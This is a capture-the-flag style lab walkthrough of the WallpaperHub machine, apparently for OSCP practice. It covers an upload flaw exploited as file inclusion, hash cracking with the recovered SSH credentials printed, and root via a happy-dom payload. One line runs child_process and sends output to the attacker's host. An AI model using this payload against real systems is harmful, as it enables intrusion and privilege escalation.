@@ -1,0 +1,223 @@
+**Start 09:02 20-05-2025**
+
+---
+```
+Scope:
+192.168.129.204
+```
+
+# Objectives
+
+>[!summary]
+>This lab demonstrates the exploitation of an unrestricted file upload vulnerability in a wallpaper sharing platform. Learners will perform local file inclusion to extract sensitive files, retrieve a database with hashed credentials, and crack them for SSH access. Privilege escalation is achieved by exploiting a vulnerable happy-dom package (CVE-2024-51757) in a web scraping tool, ultimately gaining root access through a crafted HTML payload.
+
+## Attack WallpaperHub
+
+- Perform an Nmap scan to discover open ports and services.
+
+- Exploit the unrestricted file upload vulnerability to access sensitive system files.
+
+- Extract and analyze the SQLite database to retrieve hashed user credentials.
+
+- Crack the password hash and gain SSH access as a low-privileged user.
+
+- Exploit CVE-2024-51757 in happy-dom to execute arbitrary code and escalate privileges to root.
+
+# Recon
+
+## Nmap
+
+```bash
+sudo nmap -sC -sV wallpaperhub -sT -vvvv -p- -Pn -T5 --min-rate=5000
+
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGT2bbuknyDQCZL8wcewIxfJHCT3ZA9MHovHm5vV8gnY+WaklYD1KkExYX16RT7Du6kDkOd7/VtgT8wyumO7X74=
+|   256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9T+RtTpSheh2mjfbGIXvNadPVCLuheP1AqmUPx6yic
+80/tcp   open  http    syn-ack Apache httpd 2.4.58 ((Ubuntu))
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-title: Apache2 Ubuntu Default Page: It works
+5000/tcp open  http    syn-ack Werkzeug httpd 3.0.1 (Python 3.12.3)
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD
+|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
+|_http-title: Wallpaper Hub - Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+## 5000/TCP - HTTP
+
+![](../../../assets/b644d17f70c1a95d9f2670e2a055924a.png)
+
+I went ahead and registered an account called *test*:
+
+![](../../../assets/c53d8a68431d2ff9767d4c5352de8662.png)
+
+I notice right away the **Upload Wallpaper** tab:
+
+![](../../../assets/2a2d02efc4bf497cda5116486779237a.png)
+
+I uploaded a sample `.png` file to check out the inner workings of the site:
+
+![](../../../assets/9af5d3df32b2f769d3a472a4de1743cf.png)
+
+However the upload script is unrestricted and it let's me upload any file such as a webshell:
+
+![](../../../assets/6c9bce947703cd81673a820d32aceb4f.png)
+
+Since the application is running on `python` though, it will not execute `php` code thus we need to think of something else.
+
+## LFI
+
+I intercept the request with `burpsuite` and send the request to repeater where I modify the request as follows:
+
+![](../../../assets/09fea4ce545a9d618a6af240692066b3.png)
+
+When I go ahead and press **Send** I get a response back that doesn't seem like it worked:
+
+![](../../../assets/2460a1517b0574c1014c845f6a9cb734.png)
+
+However when we check back on the website we see a fresh upload, click on it and we see the following:
+
+![](../../../assets/8a24b917f4e3273bb852801d523a2bf2.png)
+
+![](../../../assets/76c6a37ac8cb1e6b95c3bac85a06ab10.png)
+
+Awesome! We were able to fetch the `/etc/passwd` list.
+
+Now that we have performed **LFI** we need to find any sort of sensitive files containing cleartext or hashed credentials, my first though instantly went to `.ssh/id_rsa` but it looks like the user doesn't have any:
+
+![](../../../assets/f6717e7b83c8ab68a35c0dfaa8fbb391.png)
+
+### SQLite Database
+
+After a lot of guessing we find the `database.db` file location:
+
+![](../../../assets/58640da7c45b84306b387126e89d3cad.png)
+
+>[!note]
+>My first guess was the `/var/www/html` webroot, but turns out it's in the developer's home directory.
+
+![](../../../assets/468247e74ddf0a0d12516d67ea851695.png)
+
+![](../../../assets/a15ae57b4b3d4a344cbd5c5c6898c711.png)
+
+Fairly small database, good!
+
+![](../../../assets/0d5f5c6fe8b458481f9b15d1f8d22f4d.png)
+
+>[!note]
+>The *test* user is us
+
+### Hashcat
+
+![](../../../assets/3a7d86c588f8fb52b8fd1818e8c9848e.png)
+
+![](../../../assets/b0f95c7955b17fad874fd4d6dffb1715.png)
+
+```
+wp_hub
+qazwsxedc
+```
+
+# Foothold
+## Shell as wp_hub
+
+Using the found creds we log into `ssh`:
+
+![](../../../assets/01bd128b777dfa296b036e56dbdaaf21.png)
+
+### local.txt
+
+![](../../../assets/0a65759cf2f2ebb201b4051bbd83dd06.png)
+
+# Privilege Escalation
+## Enumeration
+
+I download over `linpeas` and get to work.
+
+At first glance the system looks pretty bulletproof and up to date:
+
+![](../../../assets/02737b8152d519a76f3ab272614f4640.png)
+
+We do find something super interesting though:
+
+![](../../../assets/4fa8fe5e796dc722f292c63b915add64.png)
+
+Let's check the binary out.
+
+### CVE-2024-51757
+
+![](../../../assets/c62a9aa0da3f97f13cf41f974c63105d.png)
+
+It's some `JS` code including a package called `happy-dom`, I've never heard of it before so I decide to look into it.
+
+![](../../../assets/134bcd4df93c162d22f60a9af107d528.png)
+
+![](../../../assets/d04f3d4a9f9d72fbea1fafbc172cba63.png)
+
+Seems pretty serious, good for us.
+
+## Exploitation
+
+I modified it as follows to test it out:
+
+```js
+<script src="http://192.168.45.179/'+require('child_process').execSync('id').toString()+'"></script>
+```
+
+![](../../../assets/096bda9403a4d8b9dbca16a075089093.png)
+
+On `kali` I launched a python webserver beforehand where I received the output:
+
+![](../../../assets/4e21da04ca90e36d7b6b242fe6258a02.png)
+
+It indeed executes commands under *root*.
+
+I slightly modify the `pwn.html` file:
+
+![](../../../assets/77a3f5f9be7c8c6a9d404d56539f14a9.png)
+
+And launch it again:
+
+![](../../../assets/fad872e1bab0f345ba79d002696612fa.png)
+
+>[!fail]
+>Unfortunately it failed this time, even if I URL encode it, guess we need to do it another way.
+
+Instead I went on to do the following:
+
+![](../../../assets/396059113020170a9dfb30407daaa3a9.png)
+
+I created a script called `pwn` as seen above.
+
+I then used `chmod +x` on it to make it executable.
+
+Inside my `pwn.html` file I added the following instead of the `id` command:
+
+![](../../../assets/71b3aab35a0a1137b0b66e372c119d68.png)
+
+I now reran the script:
+
+![](../../../assets/89165254adfbf95cf7ca7966c06a457a.png)
+
+Good, we can now execute `/bin/bash -p` to escalate to a *root* shell within the same session:
+
+![](../../../assets/375cf66ec6609c69fb9707a1e56487ab.png)
+
+### proof.txt
+
+![](../../../assets/b31e23ebaac7001a0b2778a73af6a98e.png)
+
+---
+
+**Finished 10:34 20-05-2025**
+
+[^Links]: [[OSCP Prep]]
+
+#CVE #LFI #SQL 
